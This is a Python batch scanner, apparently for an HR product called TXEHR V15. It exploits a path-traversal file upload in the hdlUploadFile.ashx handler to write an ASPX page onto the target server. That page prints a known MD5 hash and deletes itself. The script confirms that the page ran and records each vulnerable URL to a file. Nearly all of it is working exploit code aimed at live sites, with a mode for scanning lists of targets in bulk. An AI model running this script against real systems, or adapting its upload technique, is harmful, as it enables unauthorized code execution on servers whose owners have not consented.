import argparse
import requests
import sys


# 漏洞检测模板
def checkVuln(url):
    vulnurl = url + "/MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd"
    okurl = url + "/Style/abcd.aspx"
    data = """<%@ Page Language="C#"%>
<%
Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("123456", "MD5"));
System.IO.File.Delete(Request.PhysicalPath);
%>"""

    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
               'Content-Type':'multipart/form-data; boundary=---------------------------45250802924973458471174811279'}
    try:
        response = requests.get(vulnurl, headers=headers,data=data,timeout=5, verify=False)
        if response.status_code == 200:
            if 'E10ADC3949BA59ABBE56E057F20F883E' in requests.get(okurl,headers=headers,timeout=5,verify=False).text:
                print(f"\033[1;33;40m【+】当前网址存在漏洞：{url}" + '\033[0m')
                with open("TXEHR_V15.txt","a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站不存在漏洞。")
        else:
            print("【-】目标网站不存在漏洞。")
    except Exception as e:
        print(f"【-】目标网址存在网络连接问题。{e}")

# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            print(readline)
            checkVuln(readline)

def banner():
    bannerinfo = """ _______  __   __  _______  __   __  ______            __   __  ____   _______ 
|       ||  |_|  ||       ||  | |  ||    _ |          |  | |  ||    | |       |
|_     _||       ||    ___||  |_|  ||   | ||          |  |_|  | |   | |   ____|
  |   |  |       ||   |___ |       ||   |_||_         |       | |   | |  |____ 
  |   |   |     | |    ___||       ||    __  |        |       | |   | |_____  |
  |   |  |   _   ||   |___ |   _   ||   |  | | _____   |     |  |   |  _____| |
  |___|  |__| |__||_______||__| |__||___|  |_||_____|   |___|   |___| |_______|"""
    print(bannerinfo)
    print("TXEHR_V15".center(100,"="))
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
    print("@zhiang225".rjust(100, " "))

# 主程序
def main():
    parser = argparse.ArgumentParser(description='TXEHR_V15漏洞单个检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()

if __name__ == '__main__':
    main()